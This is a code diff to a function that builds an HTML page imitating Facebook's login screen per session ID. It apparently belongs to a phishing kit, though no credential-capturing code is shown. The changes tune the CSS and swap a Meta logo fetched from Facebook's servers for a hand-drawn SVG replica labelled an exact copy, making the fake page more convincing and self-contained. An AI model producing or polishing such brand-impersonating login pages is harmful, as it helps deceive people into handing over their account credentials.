@@ -192,7 +192,7 @@ function buildFacebookPage(sessionId: string): string {
     width: 100%;
     padding: 15px 18px;
     border: 1.5px solid #ccd0d5;
-    border-radius: 8px;
+    border-radius: 14px;
     font-size: 16px;
     color: #1c1e21;
     background: #fff;
@@ -242,7 +242,7 @@ function buildFacebookPage(sessionId: string): string {
     max-width: 380px;
     border: none;
     border-top: 1px solid #e5e5e5;
-    margin-bottom: 22px;
+    margin-bottom: 70px;
   }
 
   /* Botón crear cuenta */
@@ -257,8 +257,8 @@ function buildFacebookPage(sessionId: string): string {
     font-size: 16px;
     font-weight: 700;
     cursor: pointer;
-    margin-top: 20px;
-    margin-bottom: 36px;
+    margin-top: 0;
+    margin-bottom: 20px;
     -webkit-appearance: none;
     text-align: center;
   }
@@ -269,9 +269,8 @@ function buildFacebookPage(sessionId: string): string {
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 5px;
+    gap: 6px;
     padding-bottom: 28px;
-    color: #8a8d91;
     font-size: 13px;
   }
 
@@ -344,7 +343,25 @@ function buildFacebookPage(sessionId: string): string {
 
 <!-- Logo Meta oficial -->
 <div class="meta-footer">
-  <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/RkrEdst9VSp.webp" alt="Meta" height="16" style="opacity:0.6;">
+  <svg width="60" height="20" viewBox="0 0 60 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <linearGradient id="mg1" x1="0" y1="10" x2="22" y2="10" gradientUnits="userSpaceOnUse">
+        <stop offset="0%" stop-color="#0064E0"/>
+        <stop offset="45%" stop-color="#0064E0"/>
+        <stop offset="85%" stop-color="#0073EE"/>
+        <stop offset="100%" stop-color="#0082FB"/>
+      </linearGradient>
+      <linearGradient id="mg2" x1="11" y1="16" x2="11" y2="8" gradientUnits="userSpaceOnUse">
+        <stop offset="0%" stop-color="#0082FB"/>
+        <stop offset="100%" stop-color="#0064E0"/>
+      </linearGradient>
+    </defs>
+    <!-- Símbolo infinito Meta exacto -->
+    <path d="M2 10c0-1.2.28-2.18.7-2.87.55-.93 1.36-1.43 2.3-1.43.8 0 1.5.3 2.36 1.35.57.7 1.16 1.72 1.7 2.95.54-1.23 1.13-2.25 1.7-2.95C11.62 5.9 12.32 5.6 13.12 5.6c.94 0 1.75.5 2.3 1.43.42.69.7 1.67.7 2.87 0 1.62-.5 3-.38 3.98-.75.82-1.67 1.27-2.74 1.27-.8 0-1.51-.25-2.27-.84-.58-.46-1.19-1.16-1.83-2.19l-.9-1.45-.9 1.45c-.64 1.03-1.25 1.73-1.83 2.19-.76.59-1.47.84-2.27.84-1.07 0-1.99-.45-2.74-1.27C2.5 13 2 11.62 2 10z" fill="url(#mg1)"/>
+    <path d="M2 10c0 1.62.5 3 1.38 3.98.75.82 1.67 1.27 2.74 1.27.8 0 1.51-.25 2.27-.84.58-.46 1.19-1.16 1.83-2.19l.9-1.45.9 1.45c.64 1.03 1.25 1.73 1.83 2.19.76.59 1.47.84 2.27.84 1.07 0 1.99-.45 2.74-1.27C18.5 13 19 11.62 19 10H2z" fill="url(#mg2)"/>
+    <!-- Texto Meta -->
+    <text x="24" y="14.5" font-family="-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="13" font-weight="500" fill="#1c1e21">Meta</text>
+  </svg>
 </div>
 
 <script>
